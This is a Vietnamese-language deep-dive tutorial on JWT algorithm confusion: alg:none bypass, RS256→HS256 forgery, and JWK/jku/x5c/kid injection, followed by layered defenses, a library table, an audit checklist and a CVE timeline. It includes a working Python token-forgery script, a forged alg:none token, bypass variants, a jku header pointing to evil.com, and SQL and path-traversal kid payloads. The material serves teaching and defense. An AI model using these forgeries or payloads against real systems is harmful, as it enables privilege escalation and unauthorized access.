---
title: "Algorithm Confusion Attack — Deep Dive"
description: "Mổ xẻ chi tiết lỗ hổng Algorithm Confusion trong JWT: tấn công alg:none bypass signature, HS256/RS256 confusion dùng public key làm HMAC secret, ECDSA key confusion — kèm PoC từng bước, cơ chế bên trong, cách phòng thủ, và checklist audit."
---

## Mục lục

- [Bối cảnh: Hacker leo quyền admin bằng cách sửa 1 trường trong header](#1-bối-cảnh-hacker-leo-quyền-admin-bằng-cách-sửa-1-trường-trong-header)
- [Algorithm Confusion là gì — Hiểu bản chất lỗ hổng](#2-algorithm-confusion-là-gì--hiểu-bản-chất-lỗ-hổng)
- [Cuộc tấn công #1: alg:none — Bỏ signature hoàn toàn](#3-cuộc-tấn-công-1-algnone--bỏ-signature-hoàn-toàn)
- [Cuộc tấn công #2: RS256→HS256 — Dùng public key làm HMAC secret](#4-cuộc-tấn-công-2-rs256hs256--dùng-public-key-làm-hmac-secret)
- [Cuộc tấn công #3: Các biến thể khác — ECDSA, PSS, JWK injection](#5-cuộc-tấn-công-3-các-biến-thể-khác--ecdsa-pss-jwk-injection)
- [Vì sao lỗi này tồn tại — Nguyên nhân gốc rễ ở tầng thiết kế](#6-vì-sao-lỗi-này-tồn-tại--nguyên-nhân-gốc-rễ-ở-tầng-thiết-kế)
- [Phòng thủ — Từng lớp, từng bước](#7-phòng-thủ--từng-lớp-từng-bước)
- [Kiểm tra thư viện JWT — Ai an toàn, ai dính lỗi](#8-kiểm-tra-thư-viện-jwt--ai-an-toàn-ai-dính-lỗi)
- [Checklist audit — 10 câu hỏi tự kiểm tra](#9-checklist-audit--10-câu-hỏi-tự-kiểm-tra)
- [Timeline các CVE thực tế](#10-timeline-các-cve-thực-tế)
- [Tóm tắt — Cheat sheet & 3 nguyên tắc](#11-tóm-tắt--cheat-sheet--3-nguyên-tắc)

---

## 1. Bối cảnh: Hacker leo quyền admin bằng cách sửa 1 trường trong header

Bạn đang vận hành một API dùng JWT với RS256. Hệ thống hoạt động tốt — auth server ký token bằng **private key**, API server verify bằng **public key**. Public key được công khai tại `/.well-known/jwks.json`.

Một ngày, security team phát hiện: ai đó truy cập endpoint `/api/admin/users` — endpoint chỉ dành cho admin — nhưng user trong hệ thống chỉ có role `user`. Log cho thấy token gửi lên **verify thành công**. Bạn decode token:

```json
{
  "alg": "HS256",      ← đáng lẽ phải là RS256!
  "typ": "JWT"
}
```

```json
{
  "sub": "user-42",
  "role": "admin",     ← đáng lẽ là "user"!
  "exp": 1719306000
}
```

Token có `alg: HS256` thay vì `RS256`. Và signature vẫn **verify thành công**. Thế nào?

Kẻ tấn công đã:
1. Lấy **public key** (công khai, ai cũng download được).
2. Đổi header `alg` từ `RS256` sang `HS256`.
3. Sửa payload `role` thành `admin`.
4. Ký token bằng **HMAC-SHA256** với key = **public key RSA** (dạng PEM).
5. Server đọc `alg: HS256` → dùng "secret" (chính là public key!) để verify → pass!

> [!IMPORTANT]
> **Algorithm Confusion** (hay Key Confusion) là một trong những lỗ hổng JWT nguy hiểm nhất, xuất hiện nhiều lần trong thực tế. Nó xảy ra khi server **tin giá trị `alg` trong header** để quyết định cách verify, thay vì **cố định thuật toán phía server**. Kẻ tấn công sửa `alg` → server verify sai cách → bypass hoàn toàn.

---

## 2. Algorithm Confusion là gì — Hiểu bản chất lỗ hổng

### 2.1. Nguyên nhân cốt lõi

JWT header chứa trường `alg` cho biết thuật toán ký. Khi server **đọc `alg` từ token** để quyết định cách verify, kẻ tấn công kiểm soát được **cách server verify**:

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  FLOW BÌNH THƯỜNG (RS256):                                          │
│                                                                     │
│  Auth server:  Sign(private_key, payload)  →  token (alg: RS256)    │
│  API server:   Đọc alg=RS256 → Verify(public_key, token) → ✅       │
│                                                                     │
│  ────────────────────────────────────────────────────────────────── │
│                                                                     │
│  FLOW TẤN CÔNG (Algorithm Confusion):                               │
│                                                                     │
│  Kẻ tấn công: Sign(public_key_as_hmac, payload) → token (alg:HS256) │
│  API server:  Đọc alg=HS256 → Verify(???, token)                    │
│                                                                     │
│  ??? = cái gì? Server có cấu hình KEY nào?                          │
│     → Server có public_key (để verify RS256)                        │
│     → Nếu code verify HS256 cũng dùng public_key làm HMAC secret    │
│     → HMAC(public_key, payload) == signature kẻ tấn công tạo        │
│     → ✅ PASS! Kẻ tấn công bypass thành công!                       │
╰─────────────────────────────────────────────────────────────────────╯
```

### 2.2. Tại sao nó hoạt động — Sự nhầm lẫn giữa "key" trong symmetric vs asymmetric

Mấu chốt nằm ở việc từ **"key"** có ý nghĩa khác nhau trong symmetric vs asymmetric:

| | Symmetric (HS256) | Asymmetric (RS256) |
|---|---|---|
| **Ký bằng** | Secret (bí mật, chỉ server biết) | Private key (bí mật) |
| **Verify bằng** | **Cùng** secret | Public key (**công khai**) |
| **Key cho verify** | Secret | Public key |

Khi server cấu hình key cho RS256, nó có **public key**. Nếu kẻ tấn công đổi `alg` sang `HS256`, server code dạng:

```text
key = load_key()              // → public key (dạng PEM string hoặc bytes)
alg = token.header.alg        // → "HS256" (kẻ tấn công sửa)
verify(key, alg, token)       // → HMAC-SHA256(public_key, signing_input)
```

Server dùng **public key** (vốn dùng cho RSA verify) làm **HMAC secret**. Kẻ tấn công cũng biết public key → ký HMAC bằng cùng key → signature khớp.

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Symmetric vs Asymmetric — Sự nhầm lẫn chết người                   │
│                                                                     │
│  RS256 (ý định ban đầu):                                            │
│     private_key ─── KÝ ───▶ signature                               │
│     public_key  ─── VERIFY ─▶ ✅ / ❌                               │
│     (2 key khác nhau, public key KHÔNG ký được)                     │
│                                                                     │
│  HS256 (kẻ tấn công ép dùng):                                       │
│     public_key ─── KÝ ───▶ signature    ← kẻ tấn công làm           │
│     public_key ─── VERIFY ─▶ ✅         ← server làm                │
│     (CÙNG key! Public key bây giờ là HMAC secret)                   │
│                                                                     │
│  Kẻ tấn công biết public key (công khai) → ký được → verify pass    │
╰─────────────────────────────────────────────────────────────────────╯
```

---

## 3. Cuộc tấn công #1: alg:none — Bỏ signature hoàn toàn

### 3.1. Tổng quan

`alg: "none"` trong JWT spec (RFC 7519) có nghĩa: "token này **không có chữ ký**" — unsecured JWT. Nó tồn tại cho các trường hợp token đã được bảo vệ bởi lớp khác (VD: trong TLS mutual auth, hoặc token chỉ dùng nội bộ trong 1 process).

Trong thực tế, **gần như không bao giờ** nên accept `alg: none`. Nhưng nếu server code thiếu validation...

### 3.2. Cách tấn công — từng bước

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  BƯỚC 1: Kẻ tấn công có token hợp lệ (đăng nhập bình thường)        │
│                                                                     │
│  Token gốc:                                                         │
│    Header:  {"alg":"RS256","typ":"JWT"}                             │
│    Payload: {"sub":"user-42","role":"user","exp":1719306000}        │
│    Signature: (256 bytes RSA signature)                             │
│                                                                     │
│  BƯỚC 2: Sửa header và payload                                      │
│                                                                     │
│  Token giả mạo:                                                     │
│    Header:  {"alg":"none","typ":"JWT"}       ← đổi alg              │
│    Payload: {"sub":"user-42","role":"admin"} ← đổi role             │
│    Signature: (RỖNG — không có gì)                                  │
│                                                                     │
│  BƯỚC 3: Encode thành JWT compact                                   │
│                                                                     │
│    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.                             │
│    eyJzdWIiOiJ1c2VyLTQyIiwicm9sZSI6ImFkbWluIn0.                     │
│                                                              ↑      │
│                                              dấu chấm cuối, sau     │
│                                              đó KHÔNG có gì         │
│                                                                     │
│  BƯỚC 4: Gửi lên server                                             │
│                                                                     │
│    Authorization: Bearer eyJhbGci...payload.                        │
╰─────────────────────────────────────────────────────────────────────╯
```

### 3.3. Server code dính lỗi — Vì sao nó pass

```text
Server code (dính lỗi):

function verify(token) {
    header = decode(token.parts[0])
    alg = header.alg                   // "none"

    if (alg == "none") {
        // Không cần verify signature
        return decode(token.parts[1])   // → trả payload luôn!
    }

    // ... verify HS256, RS256 ...
}
```

Hoặc tinh vi hơn — thư viện JWT cũ tự động chấp nhận `alg: none`:

```text
// Thư viện JWT cũ (trước 2015)
jwt.verify(token, key, callback)

// Bên trong thư viện:
if header.alg == "none":
    skip verification, return payload   // ← lỗ hổng!
```

### 3.4. Các biến thể tinh vi

Kẻ tấn công không chỉ thử `"none"` — còn nhiều biến thể để bypass regex/filter:

| Giá trị `alg` | Bypass gì |
|---------------|----------|
| `"none"` | Chuẩn |
| `"None"` | Case-sensitive check: `alg != "none"` → pass |
| `"NONE"` | Tương tự |
| `"nOnE"` | Mixed case |
| `"none "` | Trailing space |
| `" none"` | Leading space |

> [!IMPORTANT]
> Check `alg` phải **case-insensitive** và **trim whitespace**. Hoặc tốt hơn: dùng **whitelist** (chỉ cho phép `["RS256"]`) thay vì **blacklist** (cấm `"none"`). Whitelist an toàn hơn vì mọi thứ ngoài danh sách đều bị reject — bạn không cần đoán kẻ tấn công nghĩ ra biến thể gì.

---

## 4. Cuộc tấn công #2: RS256→HS256 — Dùng public key làm HMAC secret

Đây là cuộc tấn công **quan trọng nhất** và **tinh vi nhất** trong Algorithm Confusion. Nó khai thác sự khác biệt cơ bản giữa symmetric và asymmetric cryptography.

### 4.1. Điều kiện để tấn công thành công

```diagram
╭────────────────────────────────────────────────────────────╮
│  Checklist — TẤT CẢ các điều kiện đều phải thỏa:           │
│                                                            │
│  ✅ Server dùng asymmetric algorithm (RS256, ES256, ...)   │
│  ✅ Kẻ tấn công biết public key (thường công khai)         │
│  ✅ Server đọc alg từ header để quyết định cách verify     │
│  ✅ Server cũng hỗ trợ HS256 (hoặc thư viện tự hỗ trợ)     │
│  ✅ Verify function dùng CÙNG key cho cả HS256 và RS256    │
│                                                            │
│  Nếu THIẾU bất kỳ điều kiện nào → tấn công THẤT BẠI        │
╰────────────────────────────────────────────────────────────╯
```

### 4.2. Cách tấn công — từng bước chi tiết

**Bước 1: Lấy public key**

Public key thường có ở:
- `/.well-known/jwks.json` (JWKS endpoint)
- Certificate của HTTPS server (TLS certificate)
- Documentation / GitHub repo

```text
# Download public key từ JWKS
curl https://auth.example.com/.well-known/jwks.json

# Hoặc lấy từ TLS certificate
openssl s_client -connect auth.example.com:443 | openssl x509 -pubkey -noout
```

**Bước 2: Chuẩn bị token giả mạo**

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Header gốc:   {"alg":"RS256","typ":"JWT","kid":"key-2024"}         │
│  Header sửa:   {"alg":"HS256","typ":"JWT"}                          │
│                         ↑                                           │
│                    đổi RS256 → HS256                                │
│                                                                     │
│  Payload gốc:   {"sub":"user-42","role":"user","exp":...}           │
│  Payload sửa:   {"sub":"user-42","role":"admin","exp":...}          │
│                                          ↑                          │
│                                     đổi role                        │
╰─────────────────────────────────────────────────────────────────────╯
```

**Bước 3: Ký bằng HMAC-SHA256 với public key làm secret**

```text
public_key_pem = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJX
ZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tS
... (phần còn lại)
-----END PUBLIC KEY-----
"""

signing_input = Base64URL(header_mới) + "." + Base64URL(payload_mới)

signature = HMAC-SHA256(
    key  = public_key_pem,      ← dùng PEM string làm HMAC key!
    data = signing_input
)

forged_token = signing_input + "." + Base64URL(signature)
```

**Bước 4: Server verify — Và nó pass**

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Server nhận forged_token                                           │
│                                                                     │
│  1. Decode header → alg = "HS256"                                   │
│                                                                     │
│  2. Server code:                                                    │
│     key = load_key()   // → public_key_pem (file RSA public key)    │
│     alg = header.alg   // → "HS256"                                 │
│                                                                     │
│  3. Vì alg = HS256:                                                 │
│     expected = HMAC-SHA256(key=public_key_pem, data=signing_input)  │
│                                                                     │
│  4. So sánh:                                                        │
│     expected == received_signature                                  │
│     (ĐÚNG! Vì kẻ tấn công cũng dùng public_key_pem để ký)           │
│                                                                     │
│  5. → ✅ Signature valid!                                           │
│     → Decode payload → role = "admin"                               │
│     → Kẻ tấn công giờ là admin                                      │
╰─────────────────────────────────────────────────────────────────────╯
```

### 4.3. Mã giả của cuộc tấn công (Python)

```python
import hmac, hashlib, base64, json

# Bước 1: Public key (công khai)
public_key = open("public_key.pem", "rb").read()

# Bước 2: Tạo header + payload giả
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "user-42", "role": "admin", "exp": 9999999999}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())

# Bước 3: Ký bằng HMAC với public key làm secret
signing_input = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(public_key, signing_input, hashlib.sha256).digest()
sig_b64 = b64url(signature)

# Bước 4: Token giả mạo hoàn chỉnh
forged_token = f"{header_b64}.{payload_b64}.{sig_b64}"
print(forged_token)
# → Gửi token này lên server → server verify pass → admin access!
```

### 4.4. Biến thể: Public key ở dạng nào

Kẻ tấn công cần thử nhiều dạng public key vì server có thể load key dưới nhiều format:

| Dạng key | Mô tả | Ví dụ |
|----------|-------|-------|
| PEM (có header/footer) | `-----BEGIN PUBLIC KEY-----\n...` | Phổ biến nhất |
| PEM (không line breaks) | `MIIBIjANBg...` (1 dòng liên tục) | Một số config |
| DER (binary) | Raw ASN.1 DER bytes | Ít phổ biến |
| JWK JSON | `{"kty":"RSA","n":"...","e":"..."}` | Từ JWKS endpoint |

Server dùng dạng nào → kẻ tấn công phải HMAC bằng **chính xác dạng đó**. Thường phải thử vài lần.

> [!TIP]
> Nếu bạn đang pentest hệ thống của mình (authorized testing), thử các dạng key khác nhau. Nhiều khi dạng PEM "chuẩn" không match mà phải dùng PEM không có newline cuối, hoặc với `\n` thay vì line break thật.

---

## 5. Cuộc tấn công #3: Các biến thể khác — ECDSA, PSS, JWK injection

### 5.1. ECDSA key confusion

Tương tự RS256→HS256, nhưng với ECDSA:

```diagram
Server dùng ES256 (ECDSA + P-256)
   → Public key (ECDSA) ~ 64-91 bytes

Kẻ tấn công:
   1. Đổi alg: ES256 → HS256
   2. Dùng ECDSA public key (nhỏ hơn RSA) làm HMAC secret
   3. Ký HMAC-SHA256 với key = ECDSA public key

Vấn đề thêm:
   ECDSA public key ngắn (32-66 bytes cho P-256)
   → HMAC key ngắn → brute-force dễ hơn? Không.
   HMAC chấp nhận key bất kỳ chiều dài. 32 bytes vẫn đủ mạnh.
```

### 5.2. JWK Injection — Nhúng key vào header

Một biến thể tinh vi: kẻ tấn công nhúng **chính key vào header JWT**, và server dùng key đó để verify:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "jwk": {
    "kty": "oct",
    "k": "c2VjcmV0LWtleS10aGF0LWF0dGFja2VyLWNvbnRyb2xz"
  }
}
```

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Kẻ tấn công:                                                       │
│    1. Tạo secret key bất kỳ: "attacker-secret"                      │
│    2. Nhúng key vào header dưới dạng JWK                            │
│    3. Ký token bằng key đó                                          │
│                                                                     │
│  Server code tệ:                                                    │
│    key = header.jwk    // ← lấy key TỪ TOKEN!                       │
│    verify(key, token)  // ← verify bằng key kẻ tấn công cung cấp    │
│    → ✅ PASS           // ← tất nhiên pass!                         │
╰─────────────────────────────────────────────────────────────────────╯
```

Tương tự với `jku` (JWK Set URL):

```json
{
  "alg": "RS256",
  "jku": "https://evil.com/.well-known/jwks.json"
}
```

Server fetch key từ URL của kẻ tấn công → lấy public key giả → verify pass.

### 5.3. x5c header injection

`x5c` (X.509 Certificate Chain) chứa certificate chain. Kẻ tấn công nhúng certificate tự ký:

```json
{
  "alg": "RS256",
  "x5c": ["MIIC+zCCAe...certificate_tự_ký..."]
}
```

Server đọc `x5c` → extract public key từ certificate → verify bằng key kẻ tấn công.

### 5.4. Bảng tổng hợp các biến thể

| Tấn công | Header bị sửa | Kẻ tấn công lợi dụng | Mức nguy hiểm |
|----------|---------------|---------------------|:---:|
| `alg: none` | `alg` → `"none"` | Server bỏ qua verify | 🔴 Cao |
| RS256→HS256 | `alg` → `"HS256"` | Public key thành HMAC secret | 🔴 Cao |
| ES256→HS256 | `alg` → `"HS256"` | ECDSA public key thành HMAC secret | 🔴 Cao |
| JWK injection | Thêm `jwk` | Server dùng key từ header | 🔴 Cao |
| `jku` injection | `jku` → URL kẻ tấn công | Server fetch key từ URL giả | 🔴 Cao |
| `x5c` injection | `x5c` → cert tự ký | Server extract key từ cert giả | 🟠 Trung bình |
| `kid` injection | `kid` → SQL/path injection | Server query DB hoặc file bằng kid | 🟠 Trung bình |

---

## 6. Vì sao lỗi này tồn tại — Nguyên nhân gốc rễ ở tầng thiết kế

### 6.1. JWT spec cho phép attacker kiểm soát verification method

Đây là **lỗi thiết kế** của JWT/JWS spec (RFC 7515, 7519). Spec nói:

> *"The `alg` header parameter identifies the cryptographic algorithm used to secure the JWS."*

Spec đặt `alg` vào **header do client gửi lên**, nghĩa là **attacker kiểm soát** cách verify. Đây là vi phạm nguyên tắc bảo mật cơ bản: **đừng bao giờ để attacker chọn thuật toán bảo mật**.

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Nguyên tắc bảo mật bị vi phạm:                                     │
│                                                                     │
│  "Never let the attacker choose the cryptographic algorithm."       │
│  "Không bao giờ để kẻ tấn công chọn thuật toán mã hóa."             │
│                                                                     │
│  JWT header chứa alg                                                │
│     → Client gửi alg                                                │
│        → Attacker kiểm soát client                                  │
│           → Attacker chọn alg                                       │
│              → Attacker chọn cách verify                            │
│                 → Attacker bypass verify                            │
╰─────────────────────────────────────────────────────────────────────╯
```

### 6.2. Thư viện JWT xử lý quá "linh hoạt"

Nhiều thư viện JWT cũ có API dạng:

```text
// API "flexible" (DỄ DÍNH LỖI)
jwt.verify(token, key)
// → Tự đọc alg từ header, tự chọn thuật toán

// API mới, an toàn hơn
jwt.verify(token, key, { algorithms: ["RS256"] })
// → Chỉ chấp nhận RS256, bất kể header nói gì
```

Nếu developer gọi `jwt.verify(token, key)` mà không truyền `algorithms`, thư viện tự quyết định dựa trên header → dính lỗi.

### 6.3. "Public key" không có nghĩa "ai biết cũng không sao"

Nhiều người nghĩ: *"Public key mà, biết cũng không ảnh hưởng."* Đúng — trong RSA, biết public key không ký được (vì ký cần private key). Nhưng khi bị ép sang HMAC, public key **trở thành** shared secret — và kẻ tấn công biết nó → ký được.

```diagram
RSA:
   public key = biết cũng OK (không ký RSA được)

HMAC (bị ép chuyển sang):
   public key = HMAC secret = biết là KÝ ĐƯỢC!
   
Đây là "confusion": key an toàn trong context A (RSA)
nhưng NGUY HIỂM trong context B (HMAC)
```

---

## 7. Phòng thủ — Từng lớp, từng bước

### 7.1. Lớp 1: Whitelist thuật toán (QUAN TRỌNG NHẤT)

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  LUẬT SỐ 1: KHÔNG BAO GIỜ ĐỌC ALG TỪ HEADER ĐỂ QUYẾT ĐỊNH           │
│             CÁCH VERIFY                                             │
│                                                                     │
│  SAI:                                                               │
│     alg = token.header.alg       // ← attacker kiểm soát            │
│     verify(token, key, alg)      // ← verify theo ý attacker        │
│                                                                     │
│  ĐÚNG:                                                              │
│     allowed_alg = "RS256"        // ← config cứng phía server       │
│     if token.header.alg != allowed_alg:                             │
│         REJECT                   // ← reject nếu alg không khớp     │
│     verify(token, key, "RS256")  // ← verify theo ý SERVER          │
╰─────────────────────────────────────────────────────────────────────╯
```

Code cụ thể:

```javascript
// Node.js (jsonwebtoken) — ĐÚNG CÁCH
jwt.verify(token, publicKey, {
  algorithms: ['RS256'],  // CHỈ chấp nhận RS256, không gì khác
});

// ❌ SAI — thiếu algorithms → thư viện đọc alg từ header
jwt.verify(token, publicKey);
```

```java
// Java (jjwt) — ĐÚNG CÁCH
Jwts.parserBuilder()
    .setSigningKey(publicKey)
    .setAllowedAlgorithms(Set.of("RS256"))  // Whitelist
    .build()
    .parseClaimsJws(token);
```

```python
# Python (PyJWT) — ĐÚNG CÁCH
jwt.decode(token, public_key, algorithms=["RS256"])

# ❌ SAI — thiếu algorithms → accept bất kỳ alg nào
jwt.decode(token, public_key)
```

### 7.2. Lớp 2: Tách riêng key cho symmetric và asymmetric

Nếu server hỗ trợ cả HS256 lẫn RS256 (hiếm khi cần, nhưng nếu có):

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  SAI: Dùng 1 key cho mọi thuật toán                                 │
│     key = load_key("key.pem")                                       │
│     verify(token, key, header.alg)                                  │
│     → HS256 + RS256 dùng cùng key → confusion!                      │
│                                                                     │
│  ĐÚNG: Mỗi thuật toán có key riêng, mapping rõ ràng                 │
│     keys = {                                                        │
│         "HS256": load_secret("hmac_secret"),  ← bí mật              │
│         "RS256": load_public_key("rsa.pub"),  ← public key          │
│     }                                                               │
│     alg = whitelist_check(header.alg)                               │
│     key = keys[alg]     ← key đúng cho thuật toán đúng              │
│     verify(token, key, alg)                                         │
╰─────────────────────────────────────────────────────────────────────╯
```

### 7.3. Lớp 3: Reject `alg: none` luôn

```text
// Trong config hoặc middleware
if (header.alg.toLowerCase().trim() === "none") {
    throw new Error("Algorithm 'none' is not allowed");
}
```

Hoặc tốt hơn: whitelist tự động loại `none` vì `none` không bao giờ nằm trong whitelist.

### 7.4. Lớp 4: Không dùng header claims (`jwk`, `jku`, `x5c`) để chọn key

```diagram
╭────────────────────────────────────────────────────────────╮
│  NGUYÊN TẮC: Key LUÔN đến từ server config,                │
│              KHÔNG BAO GIỜ từ nội dung token               │
│                                                            │
│  ❌ key = header.jwk                                       │
│  ❌ key = fetch(header.jku)                                │
│  ❌ key = extract_from_cert(header.x5c)                    │
│                                                            │
│  ✅ key = server.config.jwks[header.kid]                   │
│     (kid chỉ là INDEX để tìm key trong bộ key CỦA SERVER,  │
│      không phải key trực tiếp)                             │
╰────────────────────────────────────────────────────────────╯
```

> [!IMPORTANT]
> `kid` an toàn hơn `jwk`/`jku`/`x5c` vì `kid` chỉ là **identifier** — server tìm key trong bộ key **của chính nó**. Nhưng vẫn phải validate `kid` (tránh SQL injection, path traversal nếu kid dùng để query DB hoặc đọc file).

### 7.5. Lớp 5: Validate `kid` input

```text
// ❌ kid injection (SQL)
kid = header.kid                    // "'; DROP TABLE keys; --"
query = "SELECT key FROM keys WHERE kid = '" + kid + "'"  // SQL INJECTION!

// ❌ kid injection (path traversal)
kid = header.kid                    // "../../etc/passwd"
key = readFile("/keys/" + kid)      // PATH TRAVERSAL!

// ✅ Dùng parameterized query + validate format
if (!kid.match(/^[a-zA-Z0-9_-]+$/)) {
    throw new Error("Invalid kid format");
}
key = db.query("SELECT key FROM keys WHERE kid = ?", [kid]);
```

### 7.6. Bảng tóm tắt phòng thủ

| Lớp | Phòng thủ | Chống tấn công nào | Độ ưu tiên |
|-----|-----------|-------------------|:---:|
| 1 | Whitelist `algorithms` khi verify | Mọi algorithm confusion | 🔴 Bắt buộc |
| 2 | Tách key per-algorithm | RS256↔HS256 confusion | 🔴 Bắt buộc |
| 3 | Reject `alg: none` | alg:none bypass | 🔴 Bắt buộc |
| 4 | Không dùng `jwk`/`jku`/`x5c` từ header | Key injection | 🟠 Quan trọng |
| 5 | Validate `kid` input | SQL/path injection | 🟠 Quan trọng |
| 6 | Dùng thư viện mới nhất | CVE đã fix | 🟡 Nên làm |

---

## 8. Kiểm tra thư viện JWT — Ai an toàn, ai dính lỗi

### 8.1. Thư viện phổ biến — Trạng thái hiện tại

| Thư viện | Ngôn ngữ | Default behavior | An toàn? |
|----------|---------|------------------|:---:|
| `jsonwebtoken` (npm) | Node.js | **Yêu cầu `algorithms`** khi dùng public key | ✅ (từ v9+) |
| `jose` (npm) | Node.js | Yêu cầu key + alg explicit | ✅ |
| `PyJWT` (pip) | Python | **Bắt buộc `algorithms` param** (từ v2.4+) | ✅ |
| `python-jose` | Python | Yêu cầu `algorithms` | ✅ |
| `jjwt` (Maven) | Java | Tự detect alg từ key type, reject mismatch | ✅ |
| `nimbus-jose-jwt` | Java | Yêu cầu `JWSAlgorithm` explicit | ✅ |
| `golang-jwt` | Go | Yêu cầu key + custom parser | ✅ (từ v5+) |
| `System.IdentityModel.Tokens.Jwt` | C# | `TokenValidationParameters.ValidAlgorithms` | ✅ (nếu set) |

### 8.2. Hành vi nguy hiểm ở phiên bản CŨ

```diagram
╭─────────────────────────────────────────────────────────────────────╮
│  Trước ~2015-2016, nhiều thư viện:                                  │
│                                                                     │
│  1. KHÔNG yêu cầu algorithms param                                  │
│  2. Tự đọc alg từ header → dùng luôn                                │
│  3. Chấp nhận alg: none mặc định                                    │
│  4. Không phân biệt symmetric/asymmetric key                        │
│                                                                     │
│  Sau loạt CVE 2015-2017:                                            │
│     → Hầu hết thư viện BẮT BUỘC truyền algorithms                   │
│     → Reject alg: none mặc định                                     │
│     → Warning nếu key type không khớp alg                           │
│                                                                     │
│  NẾU bạn dùng phiên bản cũ → CẬP NHẬT NGAY                          │
╰─────────────────────────────────────────────────────────────────────╯
```

### 8.3. Cách test thư viện của bạn

Quick test — chạy đoạn code này và xem kết quả:

```python
import jwt

# Tạo token RS256 bình thường
private_key = open("private.pem").read()
public_key = open("public.pem").read()

token = jwt.encode({"sub": "test"}, private_key, algorithm="RS256")

# Test 1: Verify KHÔNG truyền algorithms
try:
    jwt.decode(token, public_key)          # ← nếu pass = NGUY HIỂM
    print("⚠️  Thư viện KHÔNG yêu cầu algorithms — CẬP NHẬT NGAY!")
except Exception as e:
    print("✅ Thư viện yêu cầu algorithms:", e)

# Test 2: Verify với algorithms=["HS256"] (algorithm confusion)
try:
    jwt.decode(token, public_key, algorithms=["HS256"])
    print("⚠️  Thư viện DÍNH Algorithm Confusion!")
except Exception as e:
    print("✅ Thư viện reject algorithm mismatch:", e)
```

---

## 9. Checklist audit — 10 câu hỏi tự kiểm tra

Dùng checklist này để kiểm tra hệ thống JWT của bạn:

| # | Câu hỏi | Trả lời mong đợi | Nếu sai |
|---|---------|-------------------|---------|
| 1 | Code verify có truyền `algorithms` whitelist không? | Có, chỉ `["RS256"]` hoặc `["HS256"]` | 🔴 Fix ngay |
| 2 | `alg: none` có bị reject không? | Có | 🔴 Fix ngay |
| 3 | Thư viện JWT phiên bản mới nhất? | Có (>2020) | 🟠 Update |
| 4 | Server có dùng `jwk`/`jku`/`x5c` từ header? | Không | 🔴 Fix ngay |
| 5 | `kid` có được validate input? | Có (regex, parameterized query) | 🟠 Fix |
| 6 | Key HS256 và RS256 có tách riêng? | Có hoặc chỉ dùng 1 loại | 🟠 Fix |
| 7 | JWKS URL có hardcode hay đọc từ token? | Hardcode phía server | 🔴 Fix ngay |
| 8 | Có check `iss`, `aud`, `exp`? | Có, đầy đủ | 🟠 Fix |
| 9 | Secret key HS256 có đủ dài (≥256 bit)? | Có (≥32 bytes) | 🟠 Fix |
| 10 | Có pentest JWT endpoint? | Có, dùng jwt_tool hoặc Burp | 🟡 Lên kế hoạch |

---

## 10. Timeline các CVE thực tế

Algorithm confusion không phải lý thuyết — nó đã xảy ra nhiều lần:

| Năm | CVE / Sự kiện | Thư viện / Hệ thống | Vấn đề |
|-----|--------------|---------------------|--------|
| 2015 | Tim McLean blog post | Nhiều thư viện | Phát hiện và công bố lỗ hổng alg:none + RS→HS |
| 2015 | CVE-2015-9235 | `jsonwebtoken` (Node.js) | Chấp nhận `alg: none` mặc định |
| 2016 | CVE-2016-10555 | `jsonwebtoken` (Node.js) | RS256→HS256 confusion với asymmetric key |
| 2016 | CVE-2016-5431 | `jose2go` (Go) | Chấp nhận `alg: none` |
| 2017 | CVE-2017-11424 | `PyJWT` (Python) | Không yêu cầu `algorithms` param |
| 2018 | CVE-2018-0114 | Cisco node-jose | JWK injection qua header |
| 2020 | CVE-2020-28042 | `jwt-go` (Go) | Không validate alg đúng cách |
| 2022 | CVE-2022-21449 | Java (Temurin/OpenJDK) | ECDSA signature validation bypass (psychic signatures) |

> [!NOTE]
> Bài blog năm 2015 của **Tim McLean** (*"Critical vulnerabilities in JSON Web Token libraries"*) là turning point. Trước đó, hầu hết thư viện JWT **đều dính lỗi**. Sau bài viết, tất cả thư viện lớn đã fix — nhưng code đã deploy trước đó vẫn chạy production, và developer dùng phiên bản cũ vẫn dính.

---

## 11. Tóm tắt — Cheat sheet & 3 nguyên tắc

### Cheat sheet

```diagram
╭────────────────────────────────────────────────────────────────────╮
│           ALGORITHM CONFUSION — CHEAT SHEET                        │
│                                                                    │
│  TẤN CÔNG:                                                         │
│  1. alg:none → bỏ signature → bypass verify                        │
│  2. RS256→HS256 → public key thành HMAC secret → forge token       │
│  3. JWK/jku injection → nhúng key giả vào header → verify pass     │
│                                                                    │
│  PHÒNG THỦ:                                                        │
│  1. WHITELIST alg: verify(token, key, {algorithms: ["RS256"]})     │
│  2. REJECT "none": luôn, không ngoại lệ                            │
│  3. Key từ SERVER config, KHÔNG từ token header                    │
│  4. Validate kid input (chống SQL/path injection)                  │
│  5. Cập nhật thư viện JWT (>2020)                                  │
│                                                                    │
│  MỘT CÂU:                                                          │
│  "Server quyết định cách verify, KHÔNG PHẢI token."                │
╰────────────────────────────────────────────────────────────────────╯
```

### 3 nguyên tắc

| # | Nguyên tắc | Giải thích |
|---|-----------|-----------|
| 1 | **Server quyết định thuật toán, không phải token** | `alg` trong header có thể bị sửa — server phải whitelist `algorithms` khi verify |
| 2 | **Key không bao giờ đến từ token** | `jwk`, `jku`, `x5c` trong header đều do attacker kiểm soát — key phải từ server config |
